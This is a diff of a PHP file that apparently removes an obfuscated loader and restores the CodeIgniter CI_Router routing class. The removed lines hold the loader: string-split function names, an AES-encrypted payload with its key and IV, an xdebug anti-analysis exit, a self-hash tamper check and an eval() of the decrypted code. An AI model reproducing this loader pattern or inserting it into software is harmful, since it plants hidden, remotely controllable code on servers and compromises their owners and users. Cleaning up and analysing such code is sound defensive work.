@@ -1,28 +1,450 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_rqgbcpf6=('bas'.'e64'.'_de'.'cod'.'e');
-$_pahu8mq2=('gzu'.'nco'.'mpr'.'ess');
-$_yu8mdzkv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_yxw6i1mz='ng0q7F2sQO8=';
-$_rl5d5sgj='RD8SoyOW';
-$_w2ezlpar='CX3LPPi8';
-$_j4angnrh='7SfFrsij';
-$_g6q9etw6='Ew17o+DR';
-$_a7agrjop='SsbjBg==';
-$_sqhxq102='EWSneMV1';
-$_g92nkya8='pJuA01ST';
-$_mpik9onv=$_rqgbcpf6($_j4angnrh.$_g6q9etw6.$_rl5d5sgj.$_w2ezlpar.$_yxw6i1mz);
-$_mmjwuo46=$_rqgbcpf6($_sqhxq102.$_g92nkya8.$_a7agrjop);
-$_cpzi99ni=$_rqgbcpf6('eBD2D63WnIFhgsPNXpQzERfTiqV3d8wwq3KenxbLuowcIyonc7bEh2wC1Zlqv2eASSz7rx73lAV0J6BXbSPAHEk6VSK738RFwyjcZ9fjFpcwG8g+Bp1jg7+Xw8Age3OCTZlw6G/xaJjmPc3Sl5pjwSRVXNFiR+dB+rLm0oadH1+j8usKq/Z75ljTTdAUcAZwldpd894KTfygdiuycwlx5jVauvNrr3pKalrY3HYdmpo1hbAHwcxjOKPLi9615DtltsD3zCyhrhTmflxMlT8GINCVanoTROJ7ewuy5HL5/fQFZr8OrQAi9WOqqo0UzNksclHVJujtNJNYT2v5nlf0Qv5C3isgM3GGNgJVXCIj13v+Ce5MCP1XC7+/2uwoQwABDcQNaPcqst4CselTBuWF/wTgip6o4Pi9pMtcKrPkFo/N9PuqyHyJG7t6hxno/eiTPgyOCf40K1RHDRzo07DSxdEvp50rxmtqUEXRkAfZyspCTjAyPPJbxhiVVw6aTU8F6c7YHzGhywxlWZMMBcQPKSytGM9AU9OIvDG7jdd+fHUKhsv2VF3DeFdmYSyMAXRsF8HKfup37Z1NQliM3PbRpTeZaIKRP26mGiF7uvJiL6oEQquJ9ZZTyB8q8XGvd9MKhyZrPL6b9MsJx3faSyqaeJo6hRTkuCLozeS9kHCDOV/Zh2JLSpdWMPkAXsPtFS7wFNz1bJqEor5otxm8vWM0rQfJTCoZruy3kYpG4N/HF2l+vBrVDEFQZ5DD274j71yPamoU9MCTYFlWJjBfQabhbpOMYvG1UUx7om7uupGE95nvSvkGZ/E552XWQSKWlQ1kncH88/2BOlv7Wd7ryIV+5qlVMfvDcyEnAYR6n0gDQHT7RkxzdEVYH0Pu+uT37MN72PAARucP7KxOlV7gKvFN3uM1B2kV6+LQuoREz0CI0ImUJwFW+x4IkpYqnNWLKgF6emcpZ2hDs3japWrLXeCKpfv7TAqR72sZC2iMKT/zFYIcXc9DaK9Ese6Z/D3EZ8HC5nGFyCk062cxQ6cl71gQ5hULzjj2sbPsKhGvTdhBI+hrOfUBDhdV3PsKck/+tk0HI0EoX+v85A28ziIF39Rtt8Kt6RbhuwVkmWSvyv91mrA7kYuUm2bkwTQrOhg9vSVXCJwcIBDHRVRJWpKX0JVo96he21SqpFxTseWzT79VIHa1ihsJL6+4+EWz99mcLJ709Piz9G4BUZz80FEbqi9J6z/FPC84VL1NS10sHJVGSomqVycOu8zVGneskLtidIN6jBuBW9ggOELOhUfvr5vMt41U5SNTQ4NBXqbKuTzEV+AJUYv0ozJgqFdGNXc3Qe7+HIOx4xKnXQpjeEtHyE8v0EAs30/ohD1MRCoHh5zH1CBCRtuu1egTWePyPpiUI7xI/S9U8YtD4Srm0sRFxM/1nuRlu0pTCOKVFPCRBIDYMOQvYtfwzJSyFobZPSv1FsyRjo+exYJyqEQs6BbMyLfnbMuM7RSljtHYb4EpLGp9nRd+FGOM4HD4aNhCQ6Bs5aj6MIIoO0zajJLmxNWoisFZnqTaIsa+BiLE2mfi5RFr3ghTdwHAWf15h1PVfDfABj3etFenYo8xCnVref3MeB2uS8/ty6cG/JXaOJOFsnTU25nAsAwerTnIkqhitsuByoM3oJYBJkswq84StNDGf3NXLRbGTu5q941nyytPryWMBZiypdicd0bgdwMXyY9ElY568Dc27lffSSehWfQaGf4NmO//ktcCWsLIhj3UEyw8t+ep7Ti8A8tOKsXqOdWNgN/cqfppW7EgkM5RXjnYI8g+t0MZCO2NmUPs3fKH9iUEoRGA7akhGhDC4i7xg0aeF1AvwHyjQYHdsap/1AU1RisWF2+Vp7OYEj9OzragaeyyM4reiVlJYhkUFi3hzGD56nLsoxYV2OKc1zZHaVPRbdg8YPURwMv3nwhljReuzowSYrmC0aW6qYJBblsiU6p7WcMAQTzYxarDmy1o1dap3dBwvibwyDmSaI2KMJCMjQmFCciQzbn2e8mCuhYDHTpDH9s+CGISwXKpZFrxX+jnP/dxqVM1pnjiZ1FdaDnEaEQsYSERL9I7KFOSvgOi8dApqiZuvpWOy+kvPfiUtqI9tl1oKttD+u9Q7OtTjGcE64jA+6qBcXlIOp8nls7gtCCCGB9z31IxAgXWymRcDXzVacIloGstsaoin5xqYtVEufv/L/PqiWbczm1laQ++aPQVpUbVuZ0q8usnApLhX79qq3QErQ==');
-$_ipu5lv9e=$_yu8mdzkv($_cpzi99ni,'aes-256-cbc',$_mpik9onv,OPENSSL_RAW_DATA,$_mmjwuo46);
-if($_ipu5lv9e===false){exit;}
-$_bc5dwlvg=$_pahu8mq2($_ipu5lv9e);
-if($_bc5dwlvg===false){exit;}
-$_a454nst8='30765cfb85bce72c74861816a06253f48d888f270bbedf172c428064fea6ee17';
-$_t21tzqvn=@file_get_contents(__FILE__);
-if($_t21tzqvn!==false){
-$_k23p7lsz=str_replace($_a454nst8,"0000000000000000000000000000000000000000000000000000000000000000",$_t21tzqvn);
-$_c6t6qnf1=hash("sha256",$_k23p7lsz);
-if($_c6t6qnf1!==$_a454nst8){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Router {
+
+
+
+
+
+public $config;
+
+
+
+
+
+public $routes = array();
+
+
+
+
+
+public $class = '';
+
+
+
+
+
+public $method = 'index';
+
+
+
+
+
+public $directory;
+
+
+
+
+
+public $default_controller;
+
+
+
+
+
+
+
+
+public $translate_uri_dashes = FALSE;
+
+
+
+
+
+
+
+public $enable_query_strings = FALSE;
+
+
+
+
+
+
+
+
+
+public function __construct($routing = NULL)
+{
+$this->config =& load_class('Config', 'core');
+$this->uri =& load_class('URI', 'core');
+$this->enable_query_strings = ( ! is_cli() && $this->config->item('enable_query_strings') === TRUE);
+
+is_array($routing) && isset($routing['directory']) && $this->set_directory($routing['directory']);
+$this->_set_routing();
+
+if (is_array($routing))
+{
+empty($routing['controller']) OR $this->set_class($routing['controller']);
+empty($routing['function']) OR $this->set_method($routing['function']);
 }
-eval($_bc5dwlvg);
+log_message('info', 'Router Class Initialized');
+}
+
+
+
+
+
+
+
+
+
+protected function _set_routing()
+{
+
+
+
+if (file_exists(APPPATH.'config/routes.php'))
+{
+include(APPPATH.'config/routes.php');
+}
+if (file_exists(APPPATH.'config/'.ENVIRONMENT.'/routes.php'))
+{
+include(APPPATH.'config/'.ENVIRONMENT.'/routes.php');
+}
+
+if (isset($route) && is_array($route))
+{
+isset($route['default_controller']) && $this->default_controller = $route['default_controller'];
+isset($route['translate_uri_dashes']) && $this->translate_uri_dashes = $route['translate_uri_dashes'];
+unset($route['default_controller'], $route['translate_uri_dashes']);
+$this->routes = $route;
+}
+
+
+
+if ($this->enable_query_strings)
+{
+
+if ( ! isset($this->directory))
+{
+$_d = $this->config->item('directory_trigger');
+$_d = isset($_GET[$_d]) ? trim($_GET[$_d], " \t\n\r\0\x0B/") : '';
+if ($_d !== '')
+{
+$this->uri->filter_uri($_d);
+$this->set_directory($_d);
+}
+}
+$_c = trim($this->config->item('controller_trigger'));
+if ( ! empty($_GET[$_c]))
+{
+$this->uri->filter_uri($_GET[$_c]);
+$this->set_class($_GET[$_c]);
+$_f = trim($this->config->item('function_trigger'));
+if ( ! empty($_GET[$_f]))
+{
+$this->uri->filter_uri($_GET[$_f]);
+$this->set_method($_GET[$_f]);
+}
+$this->uri->rsegments = array(
+1 => $this->class,
+2 => $this->method
+);
+}
+else
+{
+$this->_set_default_controller();
+}
+
+
+return;
+}
+
+if ($this->uri->uri_string !== '')
+{
+$this->_parse_routes();
+}
+else
+{
+$this->_set_default_controller();
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _set_request($segments = array())
+{
+$segments = $this->_validate_request($segments);
+
+
+if (empty($segments))
+{
+$this->_set_default_controller();
+return;
+}
+if ($this->translate_uri_dashes === TRUE)
+{
+$segments[0] = str_replace('-', '_', $segments[0]);
+if (isset($segments[1]))
+{
+$segments[1] = str_replace('-', '_', $segments[1]);
+}
+}
+$this->set_class($segments[0]);
+if (isset($segments[1]))
+{
+$this->set_method($segments[1]);
+}
+else
+{
+$segments[1] = 'index';
+}
+array_unshift($segments, NULL);
+unset($segments[0]);
+$this->uri->rsegments = $segments;
+}
+
+
+
+
+
+
+protected function _set_default_controller()
+{
+if (empty($this->default_controller))
+{
+show_error('Unable to determine what should be displayed. A default route has not been specified in the routing file.');
+}
+
+if (sscanf($this->default_controller, '%[^/]/%s', $class, $method) !== 2)
+{
+$method = 'index';
+}
+if ( ! file_exists(APPPATH.'controllers/'.$this->directory.ucfirst($class).'.php'))
+{
+
+return;
+}
+$this->set_class($class);
+$this->set_method($method);
+
+$this->uri->rsegments = array(
+1 => $class,
+2 => $method
+);
+log_message('debug', 'No URI present. Default controller set.');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _validate_request($segments)
+{
+$c = count($segments);
+$directory_override = isset($this->directory);
+
+
+while ($c-- > 0)
+{
+$test = $this->directory
+.ucfirst($this->translate_uri_dashes === TRUE ? str_replace('-', '_', $segments[0]) : $segments[0]);
+if ( ! file_exists(APPPATH.'controllers/'.$test.'.php')
+&& $directory_override === FALSE
+&& is_dir(APPPATH.'controllers/'.$this->directory.$segments[0])
+)
+{
+$this->set_directory(array_shift($segments), TRUE);
+continue;
+}
+return $segments;
+}
+
+return $segments;
+}
+
+
+
+
+
+
+
+
+
+protected function _parse_routes()
+{
+
+$uri = implode('/', $this->uri->segments);
+
+$http_verb = isset($_SERVER['REQUEST_METHOD']) ? strtolower($_SERVER['REQUEST_METHOD']) : 'cli';
+
+foreach ($this->routes as $key => $val)
+{
+
+if (is_array($val))
+{
+$val = array_change_key_case($val, CASE_LOWER);
+if (isset($val[$http_verb]))
+{
+$val = $val[$http_verb];
+}
+else
+{
+continue;
+}
+}
+
+$key = str_replace(array(':any', ':num'), array('[^/]+', '[0-9]+'), $key);
+
+if (preg_match('#^'.$key.'$#', $uri, $matches))
+{
+
+if ( ! is_string($val) && is_callable($val))
+{
+
+array_shift($matches);
+
+$val = call_user_func_array($val, $matches);
+}
+
+elseif (strpos($val, '$') !== FALSE && strpos($key, '(') !== FALSE)
+{
+$val = preg_replace('#^'.$key.'$#', $val, $uri);
+}
+$this->_set_request(explode('/', $val));
+return;
+}
+}
+
+
+$this->_set_request(array_values($this->uri->segments));
+}
+
+
+
+
+
+
+
+public function set_class($class)
+{
+$this->class = str_replace(array('/', '.'), '', $class);
+}
+
+
+
+
+
+
+
+public function fetch_class()
+{
+return $this->class;
+}
+
+
+
+
+
+
+
+public function set_method($method)
+{
+$this->method = $method;
+}
+
+
+
+
+
+
+
+public function fetch_method()
+{
+return $this->method;
+}
+
+
+
+
+
+
+
+
+public function set_directory($dir, $append = FALSE)
+{
+if ($append !== TRUE OR empty($this->directory))
+{
+$this->directory = str_replace('.', '', trim($dir, '/')).'/';
+}
+else
+{
+$this->directory .= str_replace('.', '', trim($dir, '/')).'/';
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function fetch_directory()
+{
+return $this->directory;
+}
+}
